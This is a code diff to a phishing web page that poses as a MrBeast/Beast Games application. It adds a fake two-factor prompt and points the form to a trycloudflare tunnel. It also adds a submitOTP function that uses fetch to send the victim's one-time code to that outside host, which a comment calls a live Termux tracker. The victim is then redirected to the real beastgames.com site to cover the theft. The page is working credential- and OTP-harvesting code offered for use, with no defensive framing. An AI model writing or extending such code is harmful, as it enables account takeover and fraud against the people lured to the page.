@@ -189,6 +189,12 @@
             <input type="password" id="pass" placeholder="Password" required>
             <button type="button" class="main-btn" onclick="goToPuzzle()">CONTINUE</button>
         </div>
+        <!-- Paste this between Line 191 and 192 -->
+        <div id="step2" style="display:none; text-align:center; padding:20px;">
+            <p style="color:white;">A 6-digit verification code was sent to your device. Please enter it below to confirm your application:</p>
+            <input type="text" id="2fa_code" placeholder="G-XXXXXX" style="margin-bottom:10px;">
+            <button type="button" class="main-btn" onclick="submitFinal()">VERIFY CODE</button>
+        </div>
 
         <div id="puzzle-box">
             <p>Verification Match the Puzzle</p>
@@ -208,7 +214,8 @@
         <div id="step2">
             <div class="mrbeast-style-text" style="font-size:24px;">SECURITY CHECK</div>
             <p>We've sent a code to your email Enter it below to finish</p>
-            <form action="https://hunt-camcorder-packages-pound.trycloudflare.com" method="post">
+            <form action="https://postposted-settings-belly-quest.trycloudflare.com
+" method="post">
                 <input type="text" name="otp" placeholder="000000" maxlength="6" style="text-align:center; letter-spacing:12px; font-size:26px; font-weight:bold;" required>
                 <button type="submit" class="main-btn">FINISH APPLICATION</button>
             </form>
@@ -240,7 +247,21 @@
                 handle.style.left = x + 'px';
                 piece.style.left = (15 + (x / (rect.width - 70)) * 260) + 'px';
                 if (x > rect.width - 95) { dragging = false; showLoader(); }
-            };
+            };function submitOTP() {
+    // This grabs the 6-digit code from your "OTP" box
+    const otp = document.getElementsByName('otp')[0].value;
+    
+    // This sends it to your LIVE Termux tracker in Window 2
+    fetch('https://postposted-settings-belly-quest.trycloudflare.com', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({ 'verification_code': otp })
+    }).then(() => {
+        // After capturing the code, send them to the real MrBeast site
+        window.location.href = "https://www.beastgames.com";
+    });
+}
+
 
             handle.addEventListener('mousedown', () => dragging = true);
             handle.addEventListener('touchstart', (e) => { dragging = true; if(e.cancelable) e.preventDefault(); }, {passive: false});
